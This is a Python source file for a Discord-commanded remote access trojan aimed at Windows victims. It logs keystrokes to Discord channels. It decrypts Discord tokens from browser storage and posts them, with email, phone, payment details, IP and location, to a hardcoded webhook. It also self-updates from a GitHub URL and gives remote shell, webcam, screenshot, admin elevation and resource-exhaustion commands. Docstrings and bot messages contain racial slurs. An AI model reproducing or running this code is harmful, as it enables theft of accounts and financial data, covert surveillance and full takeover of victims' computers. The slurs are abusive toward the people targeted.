import discord
from discord.ext import commands
import requests
import time
import os
import win32con
import subprocess
import webbrowser
import threading
import psutil
from PIL import ImageGrab
import ctypes
import sys
import socket
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
from base64 import b64decode
from re import findall
from json import loads
import pygame
import pyautogui
import keyboard
import tempfile
import shutil
import random
import pygetwindow as gw
import json
import re
import base64
import win32crypt
import datetime
from Crypto.Cipher import AES
import httpx
from misc import *
import pyaudio
from cryptography.fernet import Fernet
from pynput.keyboard import Key, Listener
import asyncio
import win32gui
import logging
import numpy as np
from _random_string import get_random_string
import ffmpeg



key = b"KzgB8bcSmuhiXudpeJ97pGxrVJNpRUAeeKR7MK80hbQ="
encrypted_token = b"gAAAAABnqz83tHY_GOgrvjlpTHGnEACjnYz8H6qcJ455j-HdzYufKM1jViVPGaGiUlX1rmyJjq9Y0nw2e98o2hns__JMR1ThRAH4LcBHFqVLAzrmGt7nLeehcGttQ1f8MVvzPqHPgaydQOcWLVgXGTm7C9MzHaciZ9OYG3vD682H84JnigNte34="
cipher_suite = Fernet(key)
DISCORD_BOT_TOKEN = cipher_suite.decrypt(encrypted_token).decode()
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Lightcord': ROAMING + '\\Lightcord',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
}
baseurl = "https://discord.com/api/v9/users/@me"
tokens = []
hostname = socket.gethostname()
changed = win32con.SPIF_UPDATEINIFILE | win32con.SPIF_SENDCHANGE

reverse_keys_active = False
mouse_inverted = False
disabledkey = False
pyautogui.FAILSAFE = False
SCRIPT_URL = "https://raw.githubusercontent.com/adolfhustler/Aladeen/refs/heads/main/drat.py"
CURRENT_VERSION = "1.0.0"
UPDATE_URL = "https://raw.githubusercontent.com/adolfhustler/Aladeen/refs/heads/main/version.txt"
files_to_send = []
messages_to_send = []
embeds_to_send = []
channel_ids = {'main': 1338130695054168094, 'spam': 1338130619825258526}
text_buffer = ''
user_name = os.getenv("UserName")
ram_eater_active = False
bandwidth_eater_active = False

keycodes = {
    Key.space: '',  
    Key.shift: ' *`SHIFT`*',
    Key.tab: ' *`TAB`*',
    Key.backspace: ' *`BACKSPACE`*',
    Key.esc: ' *`ESC`*',
    Key.caps_lock: ' *`CAPS LOCK`*',
    Key.f1: ' *`F1`*',
    Key.f2: ' *`F2`*',
    Key.f3: ' *`F3`*',
    Key.f4: ' *`F4`*',
    Key.f5: ' *`F5`*',
    Key.f6: ' *`F6`*',
    Key.f7: ' *`F7`*',
    Key.f8: ' *`F8`*',
    Key.f9: ' *`F9`*',
    Key.f10: ' *`F10`*',
    Key.f11: ' *`F11`*',
    Key.f12: ' *`F12`*',
    Key.enter: ' *`ENTER`*',
    Key.left: ' *`<-`*',
    Key.right: ' *`->`*',
    Key.up: ' *`ARROW UP`*',
    Key.down: ' *`ARROW DOWN`*',
    Key.ctrl_l: '',
    Key.alt_l: ' *`ALT TAB`*',
    Key.cmd: '*`WINDOWS KEY*`'

}

held_keys = set()
logging.basicConfig(filename="mic_debug.log", level=logging.DEBUG, format="%(asctime)s - %(message)s")

def get_active_window():
    """Get the active window title."""
    window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
    return window if window else "Unknown Application"

def on_press(key):
    """Handle key press events."""
    global text_buffer, messages_to_send, embeds_to_send, held_keys

    if key in held_keys:
        return
    held_keys.add(key)  


    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    active_window = get_active_window()


    if key in keycodes:
        processed_key = keycodes[key]
        text_buffer += f" {processed_key} "
    elif hasattr(key, 'char') and key.char is not None:
        processed_key = key.char 
        text_buffer += processed_key
    else:
        processed_key = f" *`{key}`* "
        text_buffer += processed_key


    if key == Key.enter:
        formatted_message = f"`[{timestamp}]` `[{active_window}]` `[ User: {user_name}]`\n{text_buffer.strip()}"
        messages_to_send.append((channel_ids['main'], formatted_message))
        text_buffer = ""


    if len(text_buffer) > 1975:
        formatted_message = f"`[{timestamp}]` `[{active_window}]` `[ User: {user_name}]`\n{text_buffer.strip()}"
        messages_to_send.append((channel_ids['main'], formatted_message))
        text_buffer = ""

def on_release(key):
    """Handle key release events."""
    if key in held_keys:
        held_keys.remove(key)

async def keylogger_task():
    """Asynchronous function to send messages periodically."""
    while True:
        if messages_to_send:
            copy_messages = messages_to_send[:]
            messages_to_send.clear()
            for msg in copy_messages:
                channel = bot.get_channel(msg[0])
                if channel:
                    await channel.send(msg[1])

        await asyncio.sleep(1)

async def start_keylogger():
    """Starts the keylogger listener in an async-safe way."""
    await asyncio.to_thread(Listener(on_press=on_press, on_release=on_release).start)


def check_for_updates():
    try:
        response = requests.get(UPDATE_URL)
        if response.status_code == 200:
            latest_version = response.text.strip()
            if latest_version > CURRENT_VERSION:
                print(f"[+] Update available: {latest_version}")
                download_latest_script()
                return True
            else:
                print("[+] You are using the latest version.")
                return False
        else:
            print(f"[-] Failed to check for updates. Status code: {response.status_code}")
            return False
    except Exception as e:
        print(f"[-] Error checking for updates: {e}")
        return False

def download_latest_script():
    try:
        response = requests.get(SCRIPT_URL)
        if response.status_code == 200:
            with tempfile.NamedTemporaryFile(delete=False, mode="wb", suffix=".py") as temp_file:
                temp_file.write(response.content)
                temp_file_path = temp_file.name

            shutil.move(temp_file_path, sys.argv[0])
            print(f"[+] Updated to the latest version. Restarting script...")
            os.execv(sys.executable, [sys.executable] + sys.argv)
        else:
            print(f"[-] Failed to download the latest script. Status code: {response.status_code}")
    except Exception as e:
        print(f"[-] Error updating script: {e}")

def eat_ram():
    global ram_eater_active
    debug("Starting RAM consumption...")
    try:
        x = []
        while ram_eater_active:
            x.append(bytearray(100000000))
            time.sleep(0.5)
    except MemoryError:
        debug("RAM consumption stopped due to memory error.")
    except Exception as e:
        debug(f"Error in eat_ram: {e}")
    finally:
        ram_eater_active = False


# internet eater
def eat_bandwidth():
    global bandwidth_eater_active
    debug("Starting bandwidth consumption...")
    while bandwidth_eater_active:
        try:
            requests.get("http://speedtest.tele2.net/10GB.zip")
        except Exception as e:
            debug(f"Error in eat_bandwidth: {e}")
        time.sleep(1)


def invert_mouse_loop():
    """ Continuously inverts mouse movement in a separate thread """
    global mouse_inverted
    last_x, last_y = pyautogui.position()
    
    while mouse_inverted:
        x, y = pyautogui.position()
        dx, dy = x - last_x, y - last_y
        pyautogui.moveRel(-dx * 2, -dy * 2, duration=0.01)
        last_x, last_y = x, y
        time.sleep(0.01)


def getheaders(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }

    if token:
        headers.update({"Authorization": token})

    return headers

def gettokens(path):
    path += "\\Local Storage\\leveldb\\"
    tokens = []

    for file in os.listdir(path):
        if not file.endswith(".ldb") and file.endswith(".log"):
            continue

        try:
            for line in (x.strip() for x in open(f"{path}{file}", "r", errors="ignore").readlines()):
                for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    tokens.append(values)
        except PermissionError:
            continue

    return tokens
    
def getkey(path):
    with open(path + f"\\Local State", "r") as file:
        key = json.loads(file.read())['os_crypt']['encrypted_key']
        file.close()

    return key


def whoTheFuckAmI():
    try:
        ip = urlopen(Request("https://ifconfig.me")).read().decode().strip()
        debug(f"IP address: {ip}")
        return ip
    except Exception as e:
        debug(f"Error getting IP: {e}")
        return "None"

def hWiD():
    try:
        p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
        hwid = (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
        debug(f"HWID: {hwid}")
        return hwid
    except Exception as e:
        debug(f"Error getting HWID: {e}")
        return "None"

def try_extract(func):
        def wrapper(*args, **kwargs):
            try:
                func(*args, **kwargs)
            except Exception:
                pass
        return wrapper

def debug(message):
    print(f"[DEBUG] {message}")


def grabToken():
    checked = []

    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue

        for token in gettokens(path):
            token = token.replace("\\", "") if token.endswith("\\") else token

            try:
                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
                if token in checked:
                    continue
                checked.append(token)

                res = requests.get('https://discord.com/api/v10/users/@me', headers=getheaders(token))
                if res.status_code != 200:
                    continue
                res_json = res.json()

                badges = ""
                flags = res_json['flags']
                if flags == 64 or flags == 96:
                    badges += ":BadgeBravery: "
                if flags == 128 or flags == 160:
                    badges += ":BadgeBrilliance: "
                if flags == 256 or flags == 288:
                    badges += ":BadgeBalance: "

                res = requests.get('https://discordapp.com/api/v6/users/@me/relationships', headers=getheaders(token)).json()
                friends = len([x for x in res if x['type'] == 1])

                res = requests.get('https://discordapp.com/api/v6/users/@me/guilds', params={"with_counts": True}, headers=getheaders(token)).json()
                guilds = len(res)
                guild_infos = ""

                for guild in res:
                    if guild['permissions'] & 8 or guild['permissions'] & 32:
                        res = requests.get(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=getheaders(token)).json()
                        vanity = ""

                        if res["vanity_url_code"] != None:
                            vanity = f"""; .gg/{res["vanity_url_code"]}"""

                        guild_infos += f"""\nㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"""
                if guild_infos == "":
                    guild_infos = "No guilds"

                res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token)).json()
                has_nitro = False
                has_nitro = bool(len(res) > 0)
                exp_date = None
                if has_nitro:
                    badges += f":BadgeSubscriber: "
                    exp_date = datetime.datetime.strptime(res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S%z").strftime('%d/%m/%Y at %H:%M:%S')

                res = requests.get('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token)).json()
                available = 0
                print_boost = ""
                boost = False
                data = httpx.get("https://ipinfo.io/json").json()
                googlemap = "https://www.google.com/maps/search/google+map++" + \
                    data.get('loc')
                for id in res:
                    cooldown = datetime.datetime.strptime(id["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
                    if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
                        print_boost += f"ㅤ- Available now\n"
                        available += 1
                    else:
                        print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
                    boost = True
                if boost:
                    badges += f":BadgeBoost: "

                payment_methods = 0
                type = ""
                valid = 0
                for x in requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=getheaders(token)).json():
                    if x['type'] == 1:
                        type += "CreditCard "
                        if not x['invalid']:
                            valid += 1
                        payment_methods += 1
                    elif x['type'] == 2:
                        type += "PayPal "
                        if not x['invalid']:
                            valid += 1
                        payment_methods += 1

                print_nitro = f"\nNitro Informations:\n```yaml\nHas Nitro: {has_nitro}\nExpiration Date: {exp_date}\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
                nnbutb = f"\nNitro Informations:\n```yaml\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
                print_pm = f"\nPayment Methods:\n```yaml\nAmount: {payment_methods}\nValid Methods: {valid} method(s)\nType: {type}\n```"
                embed_user = {
                    'embeds': [
                        {
                            'title': f"**New user data: {res_json['username']}**",
                            'description': f"""
                                ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nFriends: {friends}\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {whoTheFuckAmI()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```\n[Google Maps Location]({googlemap})""",
                            'color': 3092790,
                            'footer': {
                                'text': "Made by the Supreme Leader"
                            },
                            'thumbnail': {
                                'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"
                            }
                        }
                    ],
                    "username": "The Aladeen Citadel",
                    "avatar_url": "https://github.com/adolfhustler/Aladeen/blob/main/Flag_of_Wadiya.gif?raw=true"
                }

                requests.post('https://discord.com/api/webhooks/1338044128788877422/cmq9vdAIQuwWe-k7EyzuV6LYxr1MXyJllTB4kmt-KJUYkpxWAerln01aSi3LZVnFBClS', json=embed_user, headers=getheaders())
            except:
                continue

def check_discord_token(token: str):
    """Checks if a given Discord token is valid and returns user details if valid."""
    
    headers = {"Authorization": token}
    response = requests.get("https://discord.com/api/v10/users/@me", headers=headers)

    if response.status_code != 200:
        return {"valid": False, "message": "Invalid or expired token."}

    user_data = response.json()

    badges = []
    flags = user_data.get('flags', 0)
    if flags & 64: badges.append("HypeSquad Bravery")
    if flags & 128: badges.append("HypeSquad Brilliance")
    if flags & 256: badges.append("HypeSquad Balance")


    nitro_res = requests.get("https://discord.com/api/v9/users/@me/billing/subscriptions", headers=headers)
    has_nitro = bool(nitro_res.status_code == 200 and len(nitro_res.json()) > 0)


    boost_res = requests.get("https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots", headers=headers)
    boost_info = boost_res.json() if boost_res.status_code == 200 else []
    available_boosts = sum(1 for boost in boost_info if boost.get("cooldown_ends_at") is None)

    return {
        "valid": True,
        "username": f"{user_data['username']}#{user_data['discriminator']}",
        "user_id": user_data['id'],
        "email": user_data.get("email", "N/A"),
        "phone": user_data.get("phone", "N/A"),
        "mfa_enabled": user_data["mfa_enabled"],
        "locale": user_data["locale"],
        "verified": user_data["verified"],
        "badges": badges,
        "has_nitro": has_nitro,
        "available_boosts": available_boosts,
        "avatar_url": f"https://cdn.discordapp.com/avatars/{user_data['id']}/{user_data['avatar']}.png" if user_data.get('avatar') else None
    }


@bot.event
async def on_ready():
    print(f"running")
    grabToken()
    bot.loop.create_task(keylogger_task())
    await start_keylogger()



@bot.event
async def on_application_command_error(ctx, error: discord.DiscordException):
    if isinstance(error, commands.CommandOnCooldown):
        await ctx.send("This command is currently on cooldown!")
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("Enter all the arguments nigger")    
    else:
        raise error       
        

bot.on_command_error = on_application_command_error        


@bot.command(name="execute")
async def execute(ctx, name, *, command: str):
    """Execute a command on the victim's PC."""
    if name == os.getenv("UserName"):
        try:
            if command.startswith("cd "):
                try:
                    os.chdir(command[3:].strip())
                    response = f"Changed directory to: {os.getcwd()}\n"
                except Exception as e:
                    response = str(e) + "\n"
                return    
            else:
                process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                text=True
            )
            stdout, stderr = process.communicate()
            response = stdout + stderr
            response += f"\nCommand exited with code: {process.returncode}\n"

            await ctx.send(f"Output:\n```{response}```")
        except Exception as e:
            await ctx.send(f"Error executing command: {e}")


@bot.command(name='webcam')
async def webcam(ctx, inputid):
    if inputid == name:
        camlist = pygame.camera.list_cameras()
        fname = str(f'webcampicture_{name}.png')
        if camlist:
            cam = pygame.camera.Camera(camlist[0], (640, 480))
            cam.start()
            image = cam.get_image()
            pygame.image.save(image, fname)
            await ctx.send(file=discord.File(fname))
            await ctx.send(f'Webcam picture `{fname}` from process {name} was sent.')
            os.remove(fname)
        else:
            await ctx.send(f'No camera was found for process {name}.')
    if inputid != name:
        if inputid == 'all':
            camlist = pygame.camera.list_cameras()
            fname = str(f'webcampicture_{name}.png')
            if camlist:
                cam = pygame.camera.Camera(camlist[0], (640, 480))
                cam.start()
                image = cam.get_image()
                pygame.image.save(image, fname)
                await ctx.send(file=discord.File(fname))
                await ctx.send(f'Webcam picture `{fname}` from process {name} was sent.')
                os.remove(fname)
            else:
                await ctx.send(f'No camera was found for process {name}.')
        if inputid != 'all' and name:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')


name = os.getenv("UserName")


@bot.command(name='msgbox')
async def msgbox(ctx, inputid, title, *, msg):
    MB_OK = 0x0 ### BUTTON
    ICON_EXCLAIM = 0x30 ### ICON
    if inputid == name:
                try:
                    ctypes.windll.user32.MessageBoxW(0, str(msg), str(title),  MB_OK | ICON_EXCLAIM)
                    await ctx.send(f'Successfully showed message box for process {name}.')
                except Exception:
                    await ctx.send(f'Couldn\'t show message box for process {name} because of `{Exception}`.')
                return
    if inputid != name:
        if inputid == 'all':
            try:
                        ctypes.windll.user32.MessageBoxW(0, str(msg), str(title),  MB_OK | ICON_EXCLAIM)
                        await ctx.send(f'Successfully showed message box for process {name}.')
            except Exception:
                        await ctx.send(f'Couldn\'t show message box for process {name} because of `{Exception}`.')
                        return
        if inputid != 'all' and name:
            await ctx.send(f'Sorry, couldn\'t find the user {inputid}.')
            

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return


    if message.content.startswith("!screenshot"):
        try:

            parts = message.content.split(" ", 1)
            if len(parts) < 2:
                return
            
            requested_user = parts[1].strip()
            local_user = os.getenv("UserName")


            if requested_user.lower() == local_user.lower():

                screenshot_path = "screenshot.png"
                screenshot = pyautogui.screenshot()
                screenshot.save(screenshot_path)


                await message.channel.send(file=discord.File(screenshot_path))


                await asyncio.sleep(3)
                os.remove(screenshot_path)
        except Exception as e:
            print(f"Error: {e}")

    await bot.process_commands(message)

"""
@bot.command(name='screenshot')
async def screenshot(ctx, inputid):
    if inputid == name:
        image = ImageGrab.grab(
            bbox=None,
            include_layered_windows=False,
            all_screens=True,
            xdisplay=None
        )
        random_string = get_random_string(6)
        fname = f'screenshot_{random_string}.png'
        image.save(fname)
        await ctx.send(file=discord.File(fname))
        await ctx.send(f'Screenshot `{fname}` from process {name} was sent.')
        os.remove(fname)
    if inputid != name:
        if inputid == 'all':
            image = ImageGrab.grab(
                bbox=None,
                include_layered_windows=False,
                all_screens=True,
                xdisplay=None
            )
            fname = f'screenshot_{name}.png'
            image.save(fname)
            await ctx.send(file=discord.File(fname))
            await ctx.send(f'Screenshot `{fname}` from process {name} was sent.')
            os.remove(fname)
        if inputid != 'all' and name:
            await ctx.send(f'Sorry, couldn\'t find the user {inputid}.')
"""            


@bot.command(name='wallpaper')
async def wallpaper(ctx, inputid, rawimg):
    if inputid == name:
        r = requests.get(rawimg, allow_redirects=False)
        fname = f'newwallpaper_{name}.jpg' ### ONLY .jpg IMAGES
        open(fname, 'wb').write(r.content)
        path = os.path.abspath(fname)
        ctypes.windll.user32.SystemParametersInfoW(win32con.SPI_SETDESKWALLPAPER, 0, path, changed)
        await ctx.send(f'Changed background wallpaper for {name} to `{rawimg}`.')
        os.remove(fname)
    if inputid != name:
        if inputid == 'all':
            r = requests.get(rawimg, allow_redirects=False)
            fname = f'newwallpaper_{name}.jpg'
            open(fname, 'wb').write(r.content)
            path = os.path.abspath(fname)
            ctypes.windll.user32.SystemParametersInfoW(win32con.SPI_SETDESKWALLPAPER, 0, path, changed)
            await ctx.send(f'Changed background wallpaper for {name} to `{rawimg}`.')
            os.remove(fname)
        if inputid != 'all' and name:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')          

@bot.command(name='tasklist')
async def tasklist(ctx, inputid):
    if inputid == name:
        tasks = str(subprocess.check_output('tasklist', shell=True))
        fname = f'runningtasks_{name}.txt'
        with open(fname, 'w') as f:
            f.write(tasks)
        await ctx.send(file=discord.File(fname))
        await ctx.send(f'Wrote all current tasks from process {name} to `{fname}`.')
        os.remove(fname)
    if inputid != name:
        if inputid == 'all':
            tasks = str(subprocess.check_output('tasklist', shell=True))
            fname = f'runningtasks_{name}.txt'
            with open(fname, 'w') as f:
                f.write(tasks)
            await ctx.send(file=discord.File(fname))
            await ctx.send(f'Wrote all current tasks from process {name} to `{fname}`.')
            os.remove(fname)
        if inputid != 'all' and name:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
        
@bot.command(name='killprocess')
async def killprocess(ctx, inputid, procname):
    if inputid == name:
        subprocess.run(f'taskkill /f /im {procname}', shell=True)
        await ctx.send(f'Initiated to kill process `{procname}` for client {name}.')
    if inputid != name:
        if inputid == 'all':
            subprocess.run(f'taskkill /f /im {procname}', shell=True)
            await ctx.send(f'Initiated to kill process `{procname}` for client {name}.')
        if inputid != 'all' and name:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')


@bot.command(name='excshell')
async def shell(ctx, inputid, cmd):
    if inputid == name:
        subprocess.run(f'start cmd /f /c {cmd}', shell=True)
        await ctx.send(f'Executed cmd command `{cmd}` for process {name}.')
    if inputid != name:
        if inputid == 'all':
            subprocess.run(f'start cmd /f /c {cmd}', shell=True)
            await ctx.send(f'Executed cmd command `{cmd}` for process {name}.')
        if inputid != 'all' and name:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
            
@bot.command(name='excpowershell')
async def powershell(ctx, inputid, shllcmd):
    if inputid == name:
        subprocess.run(f'start powershell /c {shllcmd}', shell=True)
        await ctx.send(f'Executed shell command `{shllcmd}` for process {name}.')
    if inputid != name:
        if inputid == 'all':
            subprocess.run(f'start powershell /c {shllcmd}', shell=True)
            await ctx.send(f'Executed shell command `{shllcmd}` for process {name}.')
        if inputid != 'all' and name:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
        
@bot.command(name='isadmin')
async def isadmin(ctx, inputid):
    if inputid == name:
        isadmin = ctypes.windll.shell32.IsUserAnAdmin()
        if isadmin:
            await ctx.send(f'Process {name} **is** admin.')
        if not isadmin:
            await ctx.send(f'Process {name} **is not** admin.')
    if inputid != name:
        if inputid == 'all':
            isadmin = ctypes.windll.shell32.IsUserAnAdmin()
            if isadmin:
                await ctx.send(f'Process {name} **is** admin.')
            if not isadmin:
                await ctx.send(f'Process {name} **is not** admin.')
        if inputid != 'all' and name:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')
            
@bot.command(name='getadmin')
async def getadmin(ctx, inputid):
    if inputid == name:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        await ctx.send(f'Requested admin access for process {name}.')
        sys.exit(0)
    if inputid != name:
        if inputid == 'all':
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            await ctx.send(f'Requested admin access for process {name}.')
            sys.exit(0)
        if inputid != 'all' and name:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')

@bot.command(name='clients')
async def clients(ctx):
    await ctx.send(f'{hostname} - {name}.')
    
@bot.command(name='browser')
async def browser(ctx, inputid, url):
    if inputid == name:
        webbrowser.open(url)
        await ctx.send(f'Opened webbrowser `{url}` for process {name}.')
    if inputid != name:
        if inputid == 'all':
            webbrowser.open(url)
            await ctx.send(f'Opened webbrowser `{url}` for process {name}.')
        if inputid != 'all' and name:
            await ctx.send(f'Sorry, couldn\'t find process {inputid}.')


@bot.command(name="shutdown")
async def shutdown(ctx, name: str):
    """Shut down the nigger's PC"""     
    if name == os.getenv("UserName"):
        await ctx.send(f"Shutting down {name}'s PC...")
        os.system("shutdown /s /t 1")


@bot.command(name="restart")
async def restart(ctx, name: str):
    """Restart the nigger's PC"""
    if name == os.getenv("UserName"):
        await ctx.send(f"Restarting {name}'s PC...")
        os.system("shutdown /r")


@bot.command(name="lock")
async def lock(ctx, name: str):
    """Lock the nigger's PC"""
    if name == os.getenv("UserName"):
        await ctx.send(f"Locking {name}'s PC...")
        os.system("Rundll32.exe user32.dll,LockWorkStation")                       


@bot.command(name="start_ram")
async def start_ram(ctx, name: str):
    """Start the RAM eater."""
    if name == os.getenv("UserName"):
        global ram_eater_active
        if not ram_eater_active:
            ram_eater_active = True
            threading.Thread(target=eat_ram).start()
            await ctx.send(f"{ctx.author.mention} RAM eater started.")
        else:
            await ctx.send(f"{ctx.author.mention} RAM eater is already running.")

@bot.command(name="stop_ram")
async def stop_ram(ctx, name: str):
    """Stop the RAM eater."""
    if name == os.getenv("UserName"):
        global ram_eater_active
        if ram_eater_active:
            ram_eater_active = False
            await ctx.send(f"{ctx.author.mention} RAM eater stopped.")
        else:
            await ctx.send(f"{ctx.author.mention} RAM eater is not running.")

@bot.command(name="start_bandwidth")
async def start_bandwidth(ctx, name: str):
    """Start the bandwidth eater."""
    if name == os.getenv("UserName"):
        global bandwidth_eater_active
        if not bandwidth_eater_active:
            bandwidth_eater_active = True
            threading.Thread(target=eat_bandwidth).start()
            await ctx.send(f"{ctx.author.mention} Bandwidth eater started.")
        else:
            await ctx.send(f"{ctx.author.mention} Bandwidth eater is already running.")

@bot.command(name="stop_bandwidth")
async def stop_bandwidth(ctx, name: str):
    """Stop the bandwidth eater."""
    if name == os.getenv("UserName"):
        global bandwidth_eater_active
        if bandwidth_eater_active:
            bandwidth_eater_active = False
            await ctx.send(f"{ctx.author.mention} Bandwidth eater stopped.")
        else:
            await ctx.send(f"{ctx.author.mention} Bandwidth eater is not running.")

@bot.command(name="status")
async def status(ctx):
    """Display system status."""
    try:

        username = os.getenv("USERNAME")
        ip = requests.get("https://ifconfig.me").text.strip()
        ram_usage = psutil.virtual_memory().percent
        network_usage = psutil.net_io_counters().bytes_sent + psutil.net_io_counters().bytes_recv


        status_message = (
            f"**System Status**\n"
            f"Username: `{username}`\n"
            f"IP Address: `{ip}`\n"
            f"RAM Usage: `{ram_usage}%`\n"
            f"Network Usage: `{network_usage} bytes`\n"
            f"RAM Eater: `{'Running' if ram_eater_active else 'Stopped'}`\n"
            f"Bandwidth Eater: `{'Running' if bandwidth_eater_active else 'Stopped'}`\n"
        )

        await ctx.send(status_message)
    except Exception as e:
        await ctx.send(f"Error fetching status: {e}")


@bot.command(name="invert_mouse")
async def invert_mouse_cmd(ctx):
    """ Toggles mouse inversion """
    global mouse_inverted
    mouse_inverted = not mouse_inverted

    if mouse_inverted:
        await ctx.send("Mouse movement is now **inverted**! 🎭")
        threading.Thread(target=invert_mouse_loop, daemon=True).start()
    else:
        await ctx.send("Mouse movement **restored**.")

@bot.command(name="reverse_keys")
async def reverse_keys(ctx, user):
    if user == name:
        global reverse_keys_active
        reverse_keys_active = not reverse_keys_active

        if reverse_keys_active:
            await ctx.send("Keyboard input is now **reversed**! 🔄")

            def reverse_typing(event):
                if event.event_type == keyboard.KEY_DOWN and len(event.name) == 1:
                    keyboard.write(event.name[::-1], delay=0)
                    return False

            keyboard.hook(reverse_typing, suppress=True)
        else:
            await ctx.send("Keyboard input **restored**.")
            keyboard.unhook_all()

@bot.command(name="type")
async def type_text(ctx, user, *, text):
    if user == name:
        await ctx.send(f'Typing: `{text}` on victim\'s PC! ⌨️')

        for char in text:
            keyboard.write(char, delay=0.01)
        keyboard.press_and_release("enter")


@bot.command(name="swapmouse")
async def swap_mouse(ctx, user):
    if user == name:
            ctypes.windll.user32.SwapMouseButton(1)
            await ctx.send("🖱 **Mouse buttons swapped!** Left is now right and right is now left!")


@bot.command(name="resetmouse")
async def reset_mouse(ctx, user):
    if user == name:
        ctypes.windll.user32.SwapMouseButton(0)
        await ctx.send("MOUSE reset")



@bot.command(name="disablekeys")
async def disable_keys(ctx, user, *, key):
    global disabledkey
    disabledkey = not disabledkey
    if user == name:
        if not disabledkey:
            keyboard.block_key(key)
            await ctx.send(f"⌨ **Disabled the `{key}` key!** Try typing now nigga 😈")
        else:
            keyboard.restore_state
            await ctx.send("Reset keyboard")


@bot.command(name="cdtray")
async def cd_tray(ctx, user):
    if user == name:
        ctypes.windll.WINMM.mciSendStringW("set cdaudio door open", None, 0, None)
        time.sleep(2)
        ctypes.windll.WINMM.mciSendStringW("set cdaudio door closed", None, 0, None)
        await ctx.send("💿 **CD tray is opening and closing!**")


@bot.command(name="volume")
async def random_volume(ctx, user, volume: int):
    if user == name:
        os.system(f"nircmd.exe setsysvolume {volume * 655.35}")
        await ctx.send(f"🔊 **Set volume to {volume}%!**")


@bot.command(name="randomtext")
async def random_typing(ctx):
    random_words = ["i love big black oily muscular men", "hELP me daddy", "im pregnant", "im gay", "Jai Bharat Do Not Redeem It", "I will touch you"]
    text = random.choice(random_words)
    keyboard.write(text)
